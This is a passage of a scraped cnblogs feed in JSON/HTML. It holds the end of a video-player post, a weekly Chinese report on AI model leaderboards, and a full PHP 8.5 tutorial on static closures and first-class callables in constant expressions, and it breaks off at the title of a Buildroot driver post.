/></span></span></span></span></p>\n<p>可见DKVideoPlayer支持调整播放窗口大小、调整播放速度，以及旋转、截图、裁剪等功能，可谓将常见的播放操作一网打尽。</p>\n<p>更多详细的FFmpeg开发知识参见<span class=\"cke_widget_wrapper cke_widget_inline cke_widget_csdnlink cke_widget_selected\"><a class=\"cke_widget_editable cke_widget_element\" href=\"https://item.jd.com/14020415.html\" rel=\"noopener nofollow\" title=\"《FFmpeg开发实战：从零基础到短视频上线》\">《FFmpeg开发实战：从零基础到短视频上线》</a>一书。</span></p>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-17 12:15</span>&nbsp;\n<a href=\"https://www.cnblogs.com/aqi00\">aqi00</a>&nbsp;\n阅读(<span id=\"post_view_count\">123</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "大模型榜单周报（2026/1/17）",
      "link": "https://www.cnblogs.com/xjk15082/p/19495655",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/xjk15082/p/19495655\" id=\"cb_post_title_url\" title=\"发布于 2026-01-17 12:01\">\n    <span>大模型榜单周报（2026/1/17）</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h3 id=\"1-本周概览\">1. 本周概览</h3>\n<p>本周大模型领域继续保持快速发展态势，各大厂商在医疗AI、视频生成、代码能力等多个领域取得显著进展。OpenRouter模型调用量排名发生重要变化，Claude系列模型表现抢眼，百度新模型ERNIE-5.0-0110在全球LMArena文本排行榜上排名第八，展现了中国模型的强劲实力。</p>\n<h3 id=\"2-重点关注事件\">2. 重点关注事件</h3>\n<ul>\n<li>DeepSeek与北京大学合作发表关于条件记忆（conditional memory）的新论文，提出Engram模块，有望提升模型检索效率</li>\n<li>Anthropic推出工作场景智能体Claude Cowork，由Claude Code自主开发，体现了AGI在实际应用中的潜力</li>\n<li>谷歌发布新一代开源医疗AI模型MedGemma 1.5及MedASR语音识别模型，进一步扩展在医疗AI领域的布局</li>\n<li>谷歌Veo 3.1更新支持9:16竖屏视频和4K分辨率，视频生成能力持续提升</li>\n<li>智谱与华为合作开源图像生成模型GLM-Image，登顶复杂视觉文字生成和长文本渲染双榜首</li>\n<li>阿里千问APP上线超400项AI办事功能，接入阿里生态，成为全球首个能完成真实生活复杂任务的AI助手</li>\n<li>OpenAI推出独立翻译页面ChatGPT Translate，拓展应用场景</li>\n<li>百度ERNIE-5.0-0110在全球LMArena文本排行榜上排名第八，超越多个领先模型</li>\n</ul>\n<h3 id=\"3-榜单变化\">3. 榜单变化</h3>\n<ul>\n<li>\n<p><strong>OpenRouter模型调用量排名</strong>：</p>\n<ul>\n<li>整体调用量方面，Claude Opus 4.5超越上周榜首Claude Sonnet 4.5，位列第1；MiMo-V2-Flash(free)上升两名，排名第3；Gemini 3 Flash Preview由第4名下降至第5名</li>\n<li>模型市占率方面，Google保持第1；Anthropic市占率上升4.2%（17.2% → 21.5%），连续两周上升8.5%；OpenAI市占率上升3.1%（8.0% → 11.1%）；Qwen上升至第8名，替代了上周MiniMax的位置</li>\n<li>编程调用量方面，Claude Opus 4.5保持第1；Claude Sonnet 4.5排名上升2名，排名第3；DeepSeek V3.2重回前十，排名第8</li>\n</ul>\n</li>\n<li>\n<p><strong>大语言模型榜单</strong>：ERNIE-5.0-0110新上榜，排名第8，超过GPT-5.1（high），相比ERNIE-5.0-preview-1203版本上升了6名，该模型基于预发布测试，评分可能随着公开发布后的反馈而变化</p>\n</li>\n<li>\n<p><strong>图像编辑能力榜单</strong>：flux-2-max和flux-2-pro新上榜，分别排名第8、第9</p>\n</li>\n<li>\n<p><strong>文生图能力榜单</strong>：FLUX.2 [dev]Turbo新上榜，排名第10</p>\n</li>\n<li>\n<p><strong>GAIA榜单</strong>：JoinAI V2.2登顶榜首，得分达90.7%</p>\n</li>\n</ul>\n<h3 id=\"4-排行榜\">4. 排行榜</h3>\n<table>\n<thead>\n<tr>\n<th>测评类型</th>\n<th>第一名</th>\n<th>第二名</th>\n<th>第三名</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>模型调用量</td>\n<td>Claude Opus 4.5</td>\n<td>Claude Sonnet 4.5</td>\n<td>MiMo-V2-Flash(free)</td>\n</tr>\n<tr>\n<td>公司市占率</td>\n<td>Google</td>\n<td>Anthropic</td>\n<td>OpenAI</td>\n</tr>\n<tr>\n<td>编程模型调用量</td>\n<td>Claude Opus 4.5</td>\n<td>Grok Code Fast 1</td>\n<td>Claude Sonnet 4.5</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"各公司按不同能力领域排名汇总\">各公司按不同能力领域排名汇总</h4>\n<table>\n<thead>\n<tr>\n<th>测评类型</th>\n<th>领先公司</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>大语言模型 Text Arena</td>\n<td>Google、xAI、Anthropic、百度、OpenAI、智谱、阿里巴巴、月之暗面</td>\n</tr>\n<tr>\n<td>编程能力 LMArena</td>\n<td>Anthropic、OpenAI、Google、智谱、MiniMax</td>\n</tr>\n<tr>\n<td>编程能力 LiveCodeBench</td>\n<td>OpenAI、Anthropic、Google</td>\n</tr>\n<tr>\n<td>代码工程任务能力 SWE-benchLite</td>\n<td>基于Claude、Gemini、GPT、Qwen、DeepSeek开发的开源系统</td>\n</tr>\n<tr>\n<td>图像编辑和生成能力 Image Edit Arena</td>\n<td>OpenAI、Google、字节、Black Forest Labs、Reve</td>\n</tr>\n<tr>\n<td>文生图能力 Text-to-Image Arena</td>\n<td>OpenAI、Google、Black Forest Labs、腾讯、字节</td>\n</tr>\n<tr>\n<td>文生图能力 Text to Image Leaderboard</td>\n<td>OpenAI、Google、Black Forest Labs、字节、ImagineArt</td>\n</tr>\n<tr>\n<td>GPQA</td>\n<td>OpenAI、Google、xAI、Anthropic、阿里巴巴</td>\n</tr>\n<tr>\n<td>FrontierMath</td>\n<td>OpenAI、Google、DeepSeek、月之暗面、Anthropic、xAI</td>\n</tr>\n<tr>\n<td>Humanity's Last Exam</td>\n<td>Google、OpenAI、Anthropic</td>\n</tr>\n<tr>\n<td>GAIA</td>\n<td>JoinAI、Nvidia、Suzhou AI Lab&amp;Shuqian Tech、Microsoft AI Asia -Ads</td>\n</tr>\n</tbody>\n</table>\n<hr />\n<p>关注我，第一时间掌握更多AI前沿资讯！</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-17 12:01</span>&nbsp;\n<a href=\"https://www.cnblogs.com/xjk15082\">KAI智习</a>&nbsp;\n阅读(<span id=\"post_view_count\">150</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "PHP 8.5 闭包和一等可调用对象进入常量表达式",
      "link": "https://www.cnblogs.com/catchadmin/p/19494966",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/catchadmin/p/19494966\" id=\"cb_post_title_url\" title=\"发布于 2026-01-17 08:09\">\n    <span>PHP 8.5 闭包和一等可调用对象进入常量表达式</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"php-85-闭包和一等可调用对象进入常量表达式\">PHP 8.5 闭包和一等可调用对象进入常量表达式</h1>\n<h2 id=\"当配置变成运行时胶水代码\">当\"配置\"变成运行时胶水代码</h2>\n<p>PHP 配置一直有个矛盾：</p>\n<ul>\n<li>你想要声明式配置：简单的数组、常量值、属性。</li>\n<li>但你也需要一点逻辑：\"验证这个字段\"、\"选择这个处理器\"、\"格式化这个值\"、\"过滤这个列表\"。</li>\n</ul>\n<p>以前，一旦你需要在\"配置类\"的地方加逻辑，就会碰壁。PHP 故意把很多结构限制在常量表达式——基本上就是不可变的值。属性参数是最明显的例子：你可以放整数、字符串、标量数组……但不能放闭包。</p>\n<p>所以我们用各种变通方案：</p>\n<ul>\n<li>存字符串如 <code>\"App\\\\Handler::handle\"</code>，然后用 <code>call_user_func</code> 调用。</li>\n<li>在属性里用\"迷你语言\"，比如表达式字符串。</li>\n<li>用可空回调，在运行时设置默认值。</li>\n<li>在引导文件里建注册表，而不是直接在该放的地方表达。</li>\n</ul>\n<p>PHP 8.5 改变了这个局面：静态闭包和一等可调用对象现在可以出现在常量表达式中，包括：</p>\n<ul>\n<li>属性参数</li>\n<li>属性和参数的默认值</li>\n<li>常量和类常量</li>\n</ul>\n<p>这听起来像编译器特性。实际上是个\"生活质量\"升级：让你把配置放在它配置的代码旁边，不用魔术字符串或运行时初始化 hack。</p>\n<p>这篇文章会讲\"为什么\"、具体规则（有重要限制），然后深入实际模式：路由映射、处理器注册表、策略/格式化器注册表。也会讲哪些场景不适合——因为如果不小心，可调用配置确实能搞出一团乱。</p>\n<p><a href=\"https://catchadmin.com/post/2026-01/php85-closures-callables-constant-expressions\" rel=\"noopener nofollow\" target=\"_blank\">原文 PHP 8.5 闭包和一等可调用对象进入常量表达式</a></p>\n<h2 id=\"旧痛点常量太受限逻辑只能塞进运行时初始化\">旧痛点：常量太受限，逻辑只能塞进运行时初始化</h2>\n<p>PHP 8.5 之前，限制不是你不能创建闭包——而是你不能在某些\"配置槽\"里用它们。</p>\n<p>三个常见痛点：</p>\n<h3 id=\"痛点-a回调默认值参数强制运行时初始化\">痛点 A：\"回调默认值\"参数强制运行时初始化</h3>\n<p>如果你想写一个接受可选回调的函数，并且想要一个合理的默认回调，通常这样做：</p>\n<pre><code class=\"language-php\">function my_filter(array $items, ?Closure $predicate = null): array\n{\n    $predicate ??= static function ($v): bool { return !empty($v); };\n    $out = [];\n    foreach ($items as $item) {\n        if ($predicate($item)) {\n            $out[] = $item;\n        }\n    }\n    return $out;\n}\n</code></pre>\n<p>这能用……但是样板代码，而且不是\"声明式\"的。</p>\n<p>PHP 8.5 的 RFC 明确提到这个用例：允许直接声明默认回调闭包，不用可空参数的变通方案。</p>\n<h3 id=\"痛点-b属性参数不能包含真正的逻辑\">痛点 B：属性参数不能包含真正的逻辑</h3>\n<p>属性是表达规则的自然场所：</p>\n<ul>\n<li>授权检查</li>\n<li>验证</li>\n<li>序列化行为</li>\n<li>测试用例生成</li>\n</ul>\n<p>但属性参数只能是常量表达式，所以人们用字符串或表达式对象。</p>\n<p>PHP 8.5 发布公告展示了一个典型的\"之前\"模式，访问控制属性接受字符串表达式。在 PHP 8.5 中你可以直接传静态闭包。</p>\n<h3 id=\"痛点-c注册表和路由映射变成运行时引导\">痛点 C：注册表和路由映射变成运行时引导</h3>\n<p>任何时候你想要从\"键\"到\"处理器\"的映射，你可能在运行时构建它：</p>\n<pre><code class=\"language-php\">$handlers = [\n    'json' =&gt; [JsonFormatter::class, 'format'],\n    'text' =&gt; [TextFormatter::class, 'format'],\n];\n</code></pre>\n<p>这能用，但很脆弱：</p>\n<ul>\n<li>IDE 重命名重构不能可靠地跟踪字符串方法名。</li>\n<li>静态分析更难理解什么是可调用的。</li>\n<li>你需要运行时代码来组装概念上是静态配置的东西。</li>\n</ul>\n<p>PHP 8.5 的常量表达式改进让你可以把这些注册表表达为常量——并且让处理器重构安全。</p>\n<h2 id=\"什么是常量表达式为什么重要\">什么是常量表达式，为什么重要</h2>\n<p>\"常量表达式\"是 PHP 内部术语，指在必须不依赖运行时状态就能计算的上下文中允许的表达式——可以理解为\"不可变值\"。</p>\n<p>这些上下文包括：</p>\n<ul>\n<li>属性参数</li>\n<li>参数和属性的默认值</li>\n<li>（类）常量</li>\n</ul>\n<p>闭包 RFC 总结旧规则为：常量表达式被限制在实际上是\"不可变值\"的操作，闭包不包括在内——尽管闭包本质上是编译后的代码（操作码），在约束下可以被视为不可变。</p>\n<p>为什么这很重要？</p>\n<p>因为这些上下文是你想放配置的地方：</p>\n<ul>\n<li>属性是你的元数据/配置层。</li>\n<li>默认参数/属性值表达预期行为，不需要样板代码。</li>\n<li>常量表达\"这个映射不会变\"。</li>\n</ul>\n<p>换句话说：常量表达式是 PHP 引导你走向声明式代码的地方。PHP 8.5 扩展了\"声明式\"的含义。</p>\n<h2 id=\"常量中的闭包安全可读的模式和硬性规则\">常量中的闭包：安全可读的模式（和硬性规则）</h2>\n<p>PHP 8.5 允许常量表达式中的闭包——但有严格约束：</p>\n<ul>\n<li>必须是静态的（没有 <code>$this</code>）。</li>\n<li>不能通过 <code>use(...)</code> 捕获外部变量。</li>\n<li>箭头函数在常量表达式中不支持，因为它们隐式捕获变量。</li>\n</ul>\n<p>这些规则是编译时强制的。</p>\n<p>这听起来有限制，但实际上这正是这个特性安全的原因：它防止意外把\"运行时状态\"偷渡进常量。</p>\n<h3 id=\"默认回调参数不需要可空样板\">默认回调参数，不需要可空样板</h3>\n<p>这是之前过滤器示例的干净 PHP 8.5 版本：</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfunction my_filter(\n    array $items,\n    Closure $predicate = static function ($v): bool { return !empty($v); },\n): array {\n    $out = [];\n    foreach ($items as $item) {\n        if ($predicate($item)) {\n            $out[] = $item;\n        }\n    }\n    return $out;\n}\n</code></pre>\n<p>这正是闭包 RFC 强调的动机：你可以声明一个真正的默认回调，不需要\"可空 + 运行时默认\"。</p>\n<p>实际上，这也改善了工具支持：</p>\n<ul>\n<li>参数正确地类型化为 <code>Closure</code>，不是 <code>?Closure</code></li>\n<li>调用者不需要猜测 <code>null</code> 是否有特殊含义</li>\n<li>你去掉了一个分支和一行初始化噪音</li>\n</ul>\n<h3 id=\"包含可调用行为的类常量\">包含可调用行为的类常量</h3>\n<p>你可以在常量或类常量中存储闭包，把它们当作\"可调用配置\"。</p>\n<p>一个简单例子：格式化器注册表。</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfinal class Formatters\n{\n    public const MAP = [\n        'trim_lower' =&gt; static function (string $s): string {\n            return strtolower(trim($s));\n        },\n        'digits_only' =&gt; static function (string $s): string {\n            return preg_replace('/\\D+/', '', $s) ?? '';\n        },\n    ];\n}\n</code></pre>\n<p>使用：</p>\n<pre><code class=\"language-php\">$input = \"  +62 (812) 345-678  \";\n$normalized = (Formatters::MAP['digits_only'])($input);\n</code></pre>\n<p>这读起来像配置，但不是\"字符串类型\"。它是真正的 PHP，编译过的，有类型的，可重构的。</p>\n<h3 id=\"属性默认值可调用行为作为默认策略\">属性默认值：可调用行为作为默认策略</h3>\n<p>因为常量表达式中的闭包可以用作属性默认值，你可以在属性声明处定义默认策略——同样不需要运行时初始化。</p>\n<p>例子：可配置的规范化器。</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfinal class Normalizer\n{\n    public Closure $normalize = static function (string $s): string {\n        return trim($s);\n    };\n\n    public function run(string $value): string\n    {\n        return ($this-&gt;normalize)($value);\n    }\n}\n</code></pre>\n<p><strong>重要细节</strong>：常量表达式中的闭包必须是静态的，这意味着闭包本身不能用 <code>$this</code>。</p>\n<p>这是故意的权衡：常量表达式只求值一次，而 <code>$this</code> 只有在闭包为每个对象实例重新创建时才有意义（这不是常量表达式的行为方式）。</p>\n<h3 id=\"作用域闭包在正确的上下文中仍然能看到私有成员\">作用域：闭包在正确的上下文中仍然能看到私有成员</h3>\n<p>尽管闭包必须是静态的（没有 <code>$this</code>），在这些常量上下文中创建的闭包仍然遵循正常的作用域规则。RFC 说明：</p>\n<ul>\n<li>属性默认值中的闭包可以访问所在类的私有属性/方法/常量</li>\n<li>属性参数中的闭包可以访问所在类的私有成员</li>\n</ul>\n<p>这启用了一个好模式：把复杂逻辑放在私有静态辅助方法中，把闭包作为配置暴露出来。</p>\n<h2 id=\"常量中的一等可调用对象重构安全的引用不用字符串\">常量中的一等可调用对象：重构安全的引用，不用字符串</h2>\n<p>闭包适合\"内联逻辑\"。但有时候你不想要内联逻辑——你想指向一个现有的函数或静态方法。</p>\n<p>这就是一等可调用对象（FCC）的用武之地。</p>\n<p>一等可调用对象看起来像：</p>\n<pre><code class=\"language-php\">strrev(...)\nMyClass::myMethod(...)\n</code></pre>\n<p>它们产生一个转发到函数/方法的 <code>Closure</code>。</p>\n<p>PHP 8.5 现在允许常量表达式中的 FCC 语法，旨在\"完善\"常量中闭包的特性。</p>\n<h3 id=\"为什么-fcc-比字符串可调用更好\">为什么 FCC 比字符串可调用更好</h3>\n<p>比较这两个：</p>\n<pre><code class=\"language-php\">// 旧方式\npublic const HANDLERS = [\n    'reverse' =&gt; 'strrev',\n    'slug' =&gt; 'App\\\\Slugger::slugify',\n];\n</code></pre>\n<p>对比：</p>\n<pre><code class=\"language-php\">// PHP 8.5\npublic const HANDLERS = [\n    'reverse' =&gt; strrev(...),\n    'slug' =&gt; Slugger::slugify(...),\n];\n</code></pre>\n<p>第二个版本更好，因为：</p>\n<ul>\n<li>可重构：重命名和移动更可靠</li>\n<li>静态分析可以理解它是可调用的</li>\n<li>你避免了魔术字符串和运行时可调用解析</li>\n</ul>\n<h3 id=\"常量表达式中-fcc-的约束\">常量表达式中 FCC 的约束</h3>\n<p>FCC RFC 添加了一些重要限制（除了正常的 FCC 规则）：</p>\n<ul>\n<li>只支持独立函数和静态方法（<code>::</code>）。</li>\n<li>只支持 <code>function_name(...)</code> 和 <code>ClassName::methodName(...)</code> 语法。</li>\n<li>你不能用表达式构建名称（<code>($fn)(...)</code>）、数组（<code>[ClassName::class, 'method'](...)</code>），或依赖 <code>__callStatic()</code> 魔术方法。</li>\n</ul>\n<p>这是好事：它让常量表达式中的 FCC 用法清晰且可分析。</p>\n<h2 id=\"实际用例\">实际用例</h2>\n<h3 id=\"用例路由映射作为常量\">用例：路由映射作为常量</h3>\n<p>传统方式，路由映射是运行时构建的：</p>\n<pre><code class=\"language-php\">$routes = [\n    'GET /health' =&gt; [HealthController::class, 'check'],\n    'GET /posts'  =&gt; [PostsController::class, 'index'],\n];\n</code></pre>\n<p>这能用，但不是重构安全的。</p>\n<p>在 PHP 8.5 中你可以用 FCC 或静态闭包定义路由映射，作为常量：</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfinal class Routes\n{\n    public const MAP = [\n        'GET /health' =&gt; HealthController::check(...),\n        'GET /posts'  =&gt; PostsController::index(...),\n        // 快速端点的内联处理器\n        'GET /version' =&gt; static function (Request $req): Response {\n            return Response::text('ok');\n        },\n    ];\n}\n</code></pre>\n<p>现在你可以实现一个简单的分发器：</p>\n<pre><code class=\"language-php\">final class Dispatcher\n{\n    public function dispatch(Request $req): Response\n    {\n        $key = $req-&gt;method . ' ' . $req-&gt;path;\n        $handler = Routes::MAP[$key] ?? null;\n        if ($handler === null) {\n            return Response::text('Not found', 404);\n        }\n        return $handler($req);\n    }\n}\n</code></pre>\n<p>这个模式有几个好处：</p>\n<ul>\n<li>路由映射是真正的常量配置。</li>\n<li>处理器是真正的可调用对象，不是字符串。</li>\n<li>重构更安全（特别是静态方法处理器）。</li>\n</ul>\n<p>实际的路由器需要路径参数；但即使这样，\"处理器注册表\"部分通常保持静态。</p>\n<h3 id=\"用例消息总线的处理器注册表\">用例：消息总线的处理器注册表</h3>\n<p>想象一个简单的消息总线：消息类映射到处理器。</p>\n<p>旧方式：</p>\n<pre><code class=\"language-php\">$handlers = [\n    UserRegistered::class =&gt; 'App\\\\Handlers\\\\SendWelcomeEmail::handle',\n];\n</code></pre>\n<p>现在，用 PHP 8.5 FCC：</p>\n<pre><code class=\"language-php\">final class MessageHandlers\n{\n    public const MAP = [\n        UserRegistered::class =&gt; SendWelcomeEmail::handle(...),\n        OrderPaid::class      =&gt; CreateInvoice::handle(...),\n    ];\n}\n</code></pre>\n<p>分发器：</p>\n<pre><code class=\"language-php\">final class Bus\n{\n    public function __construct(private Container $container) {}\n\n    public function handle(object $message): void\n    {\n        $handler = MessageHandlers::MAP[$message::class] ?? null;\n        if ($handler === null) {\n            throw new RuntimeException('No handler registered for ' . $message::class);\n        }\n        // 如果处理器是静态的，它们可以显式接受依赖，\n        // 或者你可以调整这个模式（见下面的 DI 说明）。\n        $handler($message, $this-&gt;container);\n    }\n}\n</code></pre>\n<p>关键概念：常量表达式让你把映射保持在常量中，但你仍然控制依赖如何注入——通过签名设计。</p>\n<h3 id=\"用例策略格式化器注册表switch-语句的干净替代\">用例：策略/格式化器注册表（switch 语句的干净替代）</h3>\n<p>这是我最喜欢的实际用途：替换一个不断增长的 switch。</p>\n<pre><code class=\"language-php\">function format(string $type, mixed $value): string\n{\n    return match ($type) {\n        'json' =&gt; json_encode($value),\n        'text' =&gt; (string) $value,\n        'upper' =&gt; strtoupper((string) $value),\n        default =&gt; throw new InvalidArgumentException('Unknown formatter'),\n    };\n}\n</code></pre>\n<p>现在想象这增长到 15-30 个策略。你最终得到一个大 match 和一个 diff 磁铁。</p>\n<p>用可调用常量：</p>\n<pre><code class=\"language-php\">final class FormatterRegistry\n{\n    public const FORMATTERS = [\n        'json' =&gt; static function (mixed $v): string {\n            return json_encode($v, JSON_THROW_ON_ERROR);\n        },\n        'text' =&gt; static function (mixed $v): string {\n            return (string) $v;\n        },\n        // FCC 到原生函数\n        'reverse' =&gt; strrev(...),\n    ];\n\n    public static function format(string $type, mixed $value): string\n    {\n        $fn = self::FORMATTERS[$type] ?? null;\n        if ($fn === null) {\n            throw new InvalidArgumentException(\"Unknown formatter: {$type}\");\n        }\n        return $fn($value);\n    }\n}\n</code></pre>\n<p>现在添加策略只需要改一行。</p>\n<h2 id=\"测试和依赖注入什么该放常量什么该放容器\">测试和依赖注入：什么该放常量，什么该放容器</h2>\n<p>这个特性引导你走向\"代码即配置\"。这很好——直到你开始把运行时状态注入到应该是静态的东西里。</p>\n<p>一个好的心智模型：</p>\n<ul>\n<li><strong>常量应该包含稳定的接线</strong>：映射、策略、不依赖运行时状态的小逻辑片段。</li>\n<li><strong>DI 容器应该包含运行时组装</strong>：需要环境相关接线的对象、IO 资源、凭证、连接等。</li>\n</ul>\n<h3 id=\"好的常量可调用用法纯粹的转换和策略\">好的常量可调用用法：纯粹的转换和策略</h3>\n<p>这些在常量表达式中是安全的：</p>\n<ul>\n<li>规范化函数（trim、canonicalize）</li>\n<li>路由/分发选择逻辑</li>\n<li>只依赖输入值的验证器</li>\n<li>格式化器和映射器</li>\n</ul>\n<h3 id=\"di-的用武之地当你需要依赖时\">DI 的用武之地：当你需要依赖时</h3>\n<p>你仍然可以通过设计可调用对象显式接受依赖来混合可调用配置和 DI。</p>\n<p>例子：注册表返回一个接受 <code>(Message $m, Container $c)</code> 的可调用对象：</p>\n<pre><code class=\"language-php\">final class Handlers\n{\n    public const MAP = [\n        UserRegistered::class =&gt; static function (UserRegistered $m, Container $c): void {\n            $mailer = $c-&gt;get(Mailer::class);\n            $mailer-&gt;sendWelcome($m-&gt;email);\n        },\n    ];\n}\n</code></pre>\n<p>这保持在约束内，因为闭包是静态的且不捕获状态。\"依赖解析\"在调用时发生，容器被传入。</p>\n<p>这总是理想的吗？不是。但它是一个干净、显式的桥梁。</p>\n<h3 id=\"测试影响更好的默认值更容易覆盖\">测试影响：更好的默认值，更容易覆盖</h3>\n<p>常量表达式闭包让默认值更干净：</p>\n<ul>\n<li>函数可以有默认闭包参数（不用可空）。</li>\n<li>属性可以有默认闭包策略。</li>\n</ul>\n<p>对于测试，你仍然可以通过传递不同的闭包参数或给对象属性赋值不同的策略来覆盖行为（如果该属性设计上是可变的）。主要改进是默认行为在它该在的地方表达，你不需要运行时初始化胶水代码来创建默认闭包。</p>\n<h2 id=\"陷阱捕获状态副作用和团队可读性\">陷阱：捕获状态、副作用和团队可读性</h2>\n<p>这个特性给你在\"配置上下文\"中更多能力。能力带来新的搬起石头砸自己脚的方式。</p>\n<h3 id=\"陷阱-a试图捕获状态不会编译这是好事\">陷阱 A：试图捕获状态（不会编译——这是好事）</h3>\n<p>你不能这样做：</p>\n<pre><code class=\"language-php\">$prefix = \"prod_\";\nconst FN = static function (string $s) use ($prefix): string {\n    return $prefix . $s;\n};\n</code></pre>\n<p>常量表达式中的闭包不能通过 <code>use(...)</code> 捕获变量。</p>\n<p>这是硬性约束，它强迫你采用更好的设计：</p>\n<ul>\n<li>把值作为参数传递</li>\n<li>使用常量/类常量</li>\n<li>或者做运行时配置，而不是假装它是常量</li>\n</ul>\n<p>类似地，箭头函数在常量表达式中被阻止，因为它们隐式捕获变量。</p>\n<h3 id=\"陷阱-b在配置里隐藏副作用\">陷阱 B：在\"配置\"里隐藏副作用</h3>\n<p>如果你的\"注册表\"闭包开始做 IO、访问数据库、读取环境变量等，你就让配置变得不可预测了。</p>\n<p>一个好规则：</p>\n<p>如果可调用对象做的不只是\"计算并返回\"，考虑把它移到真正的服务中，通过静态方法引用它（或容器接线）。</p>\n<h3 id=\"陷阱-c在纯数据更清晰的地方用可调用配置\">陷阱 C：在纯数据更清晰的地方用可调用配置</h3>\n<p>仅仅因为你能在属性里放代码，不意味着你应该这样做。</p>\n<p>如果你的规则可以表达为简单数据——用数据。例子：</p>\n<ul>\n<li>允许的角色</li>\n<li>数字范围</li>\n<li>枚举集合</li>\n</ul>\n<p>可调用配置应该是你的工具，用于数据本身变得笨拙的情况（或者你否则会发明一个字符串表达式 DSL）。</p>\n<h3 id=\"陷阱-d团队间的可读性和一致性\">陷阱 D：团队间的可读性和一致性</h3>\n<p>可调用配置仍然是代码。如果你的团队经验水平不一，你需要约定：</p>\n<ul>\n<li>保持常量表达式闭包简短。</li>\n<li>当闭包超过约 10 行时，倾向于命名逻辑并通过 FCC 引用它（<code>SomeClass::somePolicy(...)</code>）。</li>\n<li>避免花哨写法（特别是嵌套匿名函数）。</li>\n</ul>\n<h2 id=\"指南什么时候配置应该保持数据什么时候可调用配置是合理的\">指南：什么时候配置应该保持\"数据\"，什么时候\"可调用配置\"是合理的</h2>\n<p>这是一套在实际代码库中通常效果不错的实用指南。</p>\n<p><strong>在以下情况倾向于纯数据配置：</strong></p>\n<ul>\n<li>规则是静态且小的（标志、列表、阈值）</li>\n<li>你想要容易序列化（比如导出配置）</li>\n<li>你想让非开发者可以编辑配置（在某些组织中）</li>\n</ul>\n<p>例子：</p>\n<pre><code class=\"language-php\">final class Limits\n{\n    public const MAX_TITLE_LENGTH = 120;\n    public const ALLOWED_SORTS = ['newest', 'popular', 'discussed'];\n}\n</code></pre>\n<p><strong>在以下情况使用可调用配置：</strong></p>\n<ul>\n<li>规则简单但不能很好地映射到数据（比如谓词）</li>\n<li>使用数据会把你推向自定义 DSL</li>\n<li>你想通过属性让配置靠近类/方法</li>\n<li>你想要重构安全的可调用对象而不是字符串</li>\n</ul>\n<p>这正是 PHP 8.5 在属性、默认值和常量中启用的。</p>\n<p><strong>保持可调用配置安全且可维护：</strong></p>\n<ul>\n<li>让闭包静态（反正是必须的）。</li>\n<li>不要试图捕获外部变量（<code>use(...)</code> 不允许）。</li>\n<li>当逻辑增长时：把它移到命名的静态方法并用 FCC 引用它，PHP 8.5 现在在常量表达式中允许这样做。</li>\n<li>只在支持的形式中使用 FCC：<code>function_name(...)</code> 和 <code>ClassName::methodName(...)</code>（不支持数组可调用语法）。</li>\n</ul>\n<h3 id=\"关于性能和-opcache-的说明\">关于性能和 opcache 的说明</h3>\n<p>如果你想知道这是否\"免费\"，两个 RFC 都提到 opcache 需要调整才能正确地在共享内存中存储这些闭包/可调用对象。</p>\n<p>换句话说：这个特性的实现考虑了真实世界的运行时环境（opcache/JIT）。目标不是微优化——而是表达力和安全性。</p>\n<h2 id=\"小结\">小结</h2>\n<p>PHP 8.5 支持常量表达式中的静态闭包和一等可调用对象，这是那种在更新日志上看起来很小、然后悄悄改善你设计 API 方式的特性：</p>\n<ul>\n<li>默认回调变得干净且类型正确（不用可空样板）。</li>\n<li>属性可以携带真正的可执行策略逻辑——不用字符串 DSL。</li>\n<li>注册表和路由映射可以定义为常量，使用重构安全的可调用对象。</li>\n</ul>\n<p>约束就是护栏：不能捕获变量、没有 <code>$this</code>、常量表达式中没有箭头函数。</p>\n<p>如果你接受这些护栏，你会得到一个真正更好的\"编译时风格\"配置层——接线是静态的、可读的、重构更安全。</p>\n<p>用它来移除胶水代码，而不是隐藏复杂性。保持可调用配置简短，给重的东西命名，让你的常量描述\"发生什么\"，而不是把它们变成迷你应用程序。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-17 08:09</span>&nbsp;\n<a href=\"https://www.cnblogs.com/catchadmin\">JaguarJack</a>&nbsp;\n阅读(<span id=\"post_view_count\">50</span>)&nbsp;\n评论(<span id=\"post_comment_count\">1</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "编写一个Buildroot 驱动",
      "link": "https://www.cnblogs.com/tianwuyvlianshui/p/19494280",
      "published": "",
